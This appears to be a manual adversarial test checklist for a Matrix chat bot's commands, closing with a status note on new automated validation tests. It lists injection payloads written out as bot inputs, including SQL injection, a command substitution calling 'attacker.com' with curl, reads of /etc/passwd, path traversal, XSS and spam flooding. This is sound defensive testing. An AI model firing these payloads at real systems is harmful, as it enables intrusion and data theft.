===========================================
PHASE 1: BASIC RECONNAISSANCE (SAFE)
===========================================

# 1. Check bot responsiveness
!!help

# 2. Get bot status
!!status

# 3. List current rules (if authorized)
!!rooms

# 4. List autoinvite configuration
!!autoinvite list


===========================================
PHASE 2: INPUT VALIDATION TESTS
===========================================

# SQL Injection Attempts
# ----------------------
!!autoinvite add !space:example.com' OR '1'='1 !room:example.com
!!autoinvite add !space'; DROP TABLE autoinvite_rules; -- !room:example.com
!!invite @user:example.com' UNION SELECT * FROM sqlite_master--
!!unblock @user:example.com' OR '1'='1

# Command Injection
# -----------------
!!invite @user:example.com`whoami`
!!autoinvite add !space:example.com;ls -la !room:example.com
!!invite @user$(curl http://attacker.com):example.com
!!autoinvite add !space:example.com&&cat /etc/passwd !room:example.com

# Path Traversal
# --------------
!!autoinvite add ../../../etc/passwd !room:example.com
!!invite @user:example.com ../../../../admin
!!autoinvite add !space:example.com ../../database.db

# Format String Attacks
# ---------------------
!!invite %s%s%s%s%s%s
!!autoinvite add %n%n%n%n !room:example.com
!!invite @user{user.__init__.__globals__}:example.com

# Null Byte Injection
# -------------------
!!help\x00
!!status\x00malicious
!!invite @user\x00admin:example.com

# Unicode Confusion
# -----------------
!!һelp (Cyrillic h)
!!help​ (zero-width space after help)
!!аutoinvite list (Cyrillic a)

# Invalid Matrix IDs
# ------------------
!!invite user:example.com (missing @)
!!autoinvite add space:example.com room:example.com (missing !)
!!invite @@user:example.com (double @)
!!autoinvite add !!space:example.com !room:example.com (double !)
!!invite @user (missing domain)
!!autoinvite add !space !room (both missing domains)
!!invite @ (just @)
!!autoinvite add ! ! (just !)

# XSS/Script Injection
# --------------------
!!invite @user<script>alert(1)</script>:example.com
!!autoinvite add !space:example.com" !room:example.com'
!!invite @user:example.com"><img src=x onerror=alert(1)>

# Extremely Long Inputs (Buffer Overflow)
# ----------------------------------------
!!invite @AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:example.com

!!autoinvite add !BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB:example.com !room:example.com

# Empty Parameters
# ----------------
!!invite "" ""
!!autoinvite add "" ""
!!unblock ""
!!invite
!!autoinvite add
!!unblock


===========================================
PHASE 3: AUTHORIZATION BYPASS TESTS
===========================================

# From Low-Privilege Account (if you have test accounts)
# -------------------------------------------------------
!!autoinvite add !testspace:example.com !testroom:example.com
!!autoinvite remove !testspace:example.com !testroom:example.com
!!invite @victim:example.com
!!unblock @banned:example.com

# Command Prefix Variations
# --------------------------
!!!!help (double prefix)
!!  help (spaces)
!!	help (tab)
!!
help (newline)
HELP (no prefix, uppercase)
help (no prefix, lowercase)
auto!!invite add (prefix in middle)

# Case Variations
# ---------------
!!HELP
!!HeLp
!!AuToInViTe AdD
!!AUTOINVITE LIST


===========================================
PHASE 4: LOGIC MANIPULATION TESTS
===========================================

# Duplicate Rule Creation
# ------------------------
!!autoinvite add !testspace:example.com !testroom:example.com
!!autoinvite add !testspace:example.com !testroom:example.com
!!autoinvite list

# Remove Non-Existent Rule
# -------------------------
!!autoinvite remove !nonexistent:example.com !noroom:example.com

# Unblock Non-Blocked User
# -------------------------
!!unblock @neverblocked:example.com

# Self-Referential Rules
# ----------------------
!!autoinvite add !testspace:example.com !testspace:example.com


===========================================
PHASE 5: RESOURCE EXHAUSTION TESTS
===========================================

# Rapid Command Spam (execute quickly in succession)
# ---------------------------------------------------
!!status
!!status
!!status
!!status
!!status
!!status
!!status
!!status
!!status
!!status

# Mass Invite Spam
# ----------------
!!invite @user1:example.com
!!invite @user2:example.com
!!invite @user3:example.com
!!invite @user4:example.com
!!invite @user5:example.com
[continue for 50+ users]

# Invite to Non-Existent Spaces
# ------------------------------
!!invite @testuser:example.com !nonexistent1:example.com
!!invite @testuser:example.com !nonexistent2:example.com
!!invite @testuser:example.com !nonexistent3:example.com


===========================================
PHASE 6: ERROR MESSAGE ANALYSIS
===========================================

# Invalid Commands (check error verbosity)
# -----------------------------------------
!!invalid
!!autoinvite invalid invalid invalid
!!invite invalid
!!unblock invalid
!!rooms extra parameters

# Trigger errors and document:
# - Stack traces
# - File paths
# - Database schema info
# - Internal implementation details
# - User enumeration possibilities


===========================================
PHASE 7: TIMING & RACE CONDITIONS
===========================================

# Execute these simultaneously (use multiple Matrix clients)
# -----------------------------------------------------------
# Client 1:
!!autoinvite add !testspace:example.com !testroom:example.com

# Client 2 (at same time):
!!autoinvite remove !testspace:example.com !testroom:example.com

# Then verify:
!!autoinvite list


===========================================
PHASE 8: EDGE CASES & UNUSUAL INPUTS
===========================================

# Numeric IDs (if accepted)
# --------------------------
!!invite 12345
!!autoinvite add 99999 88888

# Special Characters
# ------------------
!!invite @user!@#$%:example.com
!!autoinvite add !space-with-dash:example.com !room_with_underscore:example.com
!!invite @user:example.com:8448 (port in domain)

# Internationalized Domain Names
# -------------------------------
!!invite @user:münchen.example.com
!!autoinvite add !space:日本.example.com !room:example.com

# IPv6 Addresses (if supported)
# ------------------------------
!!invite @user:[::1]
!!autoinvite add !space:[2001:db8::1] !room:example.com

# Mixed Case in IDs
# -----------------
!!invite @UsEr:ExAmPlE.cOm
!!autoinvite add !SpAcE:ExAmPlE.cOm !RoOm:ExAmPlE.cOm


===========================================
IMPLEMENTATION STATUS (2026-02-11)
===========================================

This checklist now has automated regression coverage for strict input validation.

Automated coverage added:
- Strict command parsing and command-token validation
- Null-byte, hidden-character, and unicode-confusable command rejection
- Invalid Matrix user/room/alias ID rejection
- Command/path-injection-shaped payload rejection at validation layer
- Oversized argument rejection
- Baseline valid command format acceptance (`!!help`)

Automated run result:
- Command used: `uv run python -m unittest discover -s tests -v`
- Result: 12 tests passed, 0 failed

Notes:
- This file remains a manual adversarial checklist. The new tests are in:
  - `tests/test_validation.py`
  - `tests/test_dispatch_security.py`
